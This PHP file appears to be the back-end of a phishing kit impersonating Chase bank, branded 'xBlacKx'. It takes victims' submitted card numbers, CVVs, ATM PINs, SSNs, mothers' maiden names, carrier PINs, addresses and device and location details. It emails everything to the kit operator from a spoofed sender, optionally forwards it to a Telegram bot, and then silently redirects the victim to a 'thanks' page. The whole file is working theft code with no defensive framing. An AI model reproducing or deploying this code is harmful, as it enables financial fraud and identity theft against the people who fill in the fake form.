<?php
include "config.php";
include "Main.php";
include_once 'functions.php';
error_reporting(0);

$ip = getUserIP();
$randomnumber = rand(1, 100);

function validatecard($number)
 {
    global $type;

    $cardtype = array(
        "visa"       => "/^4[0-9]{12}(?:[0-9]{3})?$/",
        "mastercard" => "/^5[1-5][0-9]{14}$/",
        "amex"       => "/^3[47][0-9]{13}$/",
        "discover"   => "/^6(?:011|5[0-9]{2})[0-9]{12}$/",
    );

    if (preg_match($cardtype['visa'],$number))
    {
	$type= "visa";
        return 'visa';
	
    }
    else if (preg_match($cardtype['mastercard'],$number))
    {
	$type= "mastercard";
        return 'mastercard';
    }
    else if (preg_match($cardtype['amex'],$number))
    {
	$type= "amex";
        return 'amex';
	
    }
    else if (preg_match($cardtype['discover'],$number))
    {
	$type= "discover";
        return 'discover';
    }
    else
    {
        return false;
    } 
 }
$bin = check_bin($_POST['cc']);
$bins = preg_replace('/\s/', '', $_POST['cc']);
$bins = substr($bins,0,6);
if($bin["brand"] == "") {
        $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"])." # $cn - $ip - $br";
    $subbin = $bins." - ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["bank"]["name"]);
} else {
    $subject = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"])." # $cn - $ip - $br";
    $subbin = "💟 [".$bins."] ".strtoupper($bin["scheme"])." ".strtoupper($bin["type"])." ".strtoupper($bin["brand"])." ".strtoupper($bin["bank"]["name"]);
}
$expnya = $_POST['exp'];
$expired = str_replace("/", "|", $expnya);
$forcheck = "".$_POST['cc']."|".$expired."|".$_POST['cvv']."";
$fromsend = "FROM: ".$_POST['fname']." ".$_POST['lname']." <admin@xblackx.coder>";
$msg = '
<p>
<b>=========[💲CARD DETAILS💲]=========</b><br>
Bank : '.$bin["bank"]["name"].'<br>
Type : '.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'<br>
Level : '.strtoupper($bin["brand"]).'<br>
Card Holder : '.$_POST['fname'].' '.$_POST['lname'].'<br>
Card Number : '.$_POST['cc'].'<br>
Expired : '.$_POST['exp'].'<br>
CVV : '.$_POST['cvv'].'<br>
Amex CID : '.$cid.'<br>
Mothers Maiden Name : '.$_POST['mmn'].'<br>
ATM Pin : '.$_POST['atm_pin'].'<br>
For Check : '.$forcheck.'<br>
<b>=========[💲PERSONAL DETAILS💲]=========</b><br>
First name : '.$_POST['fname'].'<br>
Last name : '.$_POST['lname'].'<br>
Date of birth : '.$_POST['dob'].'<br>
SSN : '.$_POST['ssn'].'<br>
State : '.$_POST['state'].'<br>
Street address : '.$_POST['address'].'<br>
Suite/apt/other : '.$_POST['address2'].'<br>
ZIP : '.$_POST['zip'].'<br>
Phone number : '.$_POST['phone'].'<br>
Carrier Pin : '.$_POST['carrierpin'].'<br>
<b>=========[💲DEVICE INFO💲]=========</b><br>
Country : '.$cn.'<br>
Region : '.$regioncity.'<br>
City : '.$citykota.'<br>
Continent : '.$continent.'<br>
Curs : '.$kurenci.'<br>
OS / BR : '.$os.' / '.$br.'<br>
User Agent : '.$user_agent.'<br>
Timezone : '.$timezone.'<br>
ISP : '.$ispuser.'<br>
IP : '.$ip.'<br>
Date : '.$date.'<br>
<b>=========[♥️xBlacKx - CHASE♥️]=========</b>
</p>
';
$msgtg = '
*=========[💲CHASE CC💲]=========*
Bank : '.$bin["bank"]["name"].'
Type : '.strtoupper($bin["scheme"]).' - '.strtoupper($bin["type"]).'
Level : '.strtoupper($bin["brand"]).'
Card Holder : `'.$_POST['fname'].' '.$_POST['lname'].'`
Card Number : `'.$_POST['cc'].'`
Expired : `'.$_POST['exp'].'`
CVV : `'.$_POST['cvv'].'`
Amex CID : `'.$cid.'`
Mothers Maiden Name : `'.$_POST['mmn'].'`
ATM Pin : '.$_POST['atm_pin'].'
For Check : `'.$forcheck.'`
First name : `'.$_POST['fname'].'`
Last name : `'.$_POST['lname'].'`
Date of birth : `'.$_POST['dob'].'`
SSN : `'.$_POST['ssn'].'`
State : '.$_POST['state'].'
Street address : `'.$_POST['address'].'`
Suite/apt/other : `'.$_POST['address2'].'`
ZIP : `'.$_POST['zip'].'`
Phone number : `'.$_POST['phone'].'`
Carrier Pin : `'.$_POST['carrierpin'].'`
*=========[👁‍🗨DEVICE INFO👁‍🗨]=========*
*IP* : http://www.geoiptool.com/?IP='.$ip.'
*Date* : `'.$date.'`
*USER AGENT* : '.$_SERVER['HTTP_USER_AGENT'].'
*OS / BR* : '.$os.'
';

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: ♥️xBlacKx♥️ <admin@xblackx.coder>' . "\r\n";
$kirim = mail($toEmail, $subject, $msg, $headers);
#Send To Telegram
if ($Telegram_Logs=="yes") {
    telegramBot('sendMessage', [
      'chat_id' => TELEGRAM_BOT_ADMIN_USERID,
      'text' => ($subject .$msgtg),
      'parse_mode'=>'markdown',
      'reply_markup'=>json_encode([
      'inline_keyboard'=>[
       [['text'=>"⚔️ ↝Channel↜ ⚔️", 'url'=>"https://t.me/Anonymous_Hackez_Channel"]],
       [['text'=>"⚔️ ↝Coder↜ ⚔️", 'url'=>"https://t.me/xblackx_Coder0"]],
      ]
              ])
              ]);
}

echo "<form id='xblackx' method='POST' action='../thanks.php'>
<input type='hidden' name='fname' value='".$_POST['fname']."'>
</form><script type='text/javascript'>document.getElementById('xblackx').submit();</script>";
?>